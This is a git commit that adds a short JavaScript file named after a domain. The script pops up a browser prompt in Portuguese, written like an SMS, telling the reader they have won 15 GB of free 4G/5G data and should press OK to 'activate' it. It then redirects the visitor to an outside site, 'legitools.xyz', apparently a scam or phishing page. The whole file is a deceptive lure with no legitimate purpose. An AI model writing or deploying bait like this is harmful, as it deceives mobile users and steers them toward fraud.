b56db12e4d4a17d2ea9f9da6550e87e86d2889c4
harryjohnson86 <mfonjohnson86@gmail.com>
2025-03-10 00:15:31 -0700

    Create 4g-5gsim-15gbdata.com.js

---
+++ 4g-5gsim-15gbdata.com.js
@@ -0,0 +1,5 @@
+var password = '15 GB de dados grátis'
+password=prompt('SMS: Parabéns! Seu número é elegível para receber 15 GB de dados grátis 4G ou 5G UPGRADE SIM CARD REWARD, Por favor, pressione OK para ATIVAR. ','15 GB de dados grátis');
+if (password != '15 GB de dados grátis') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
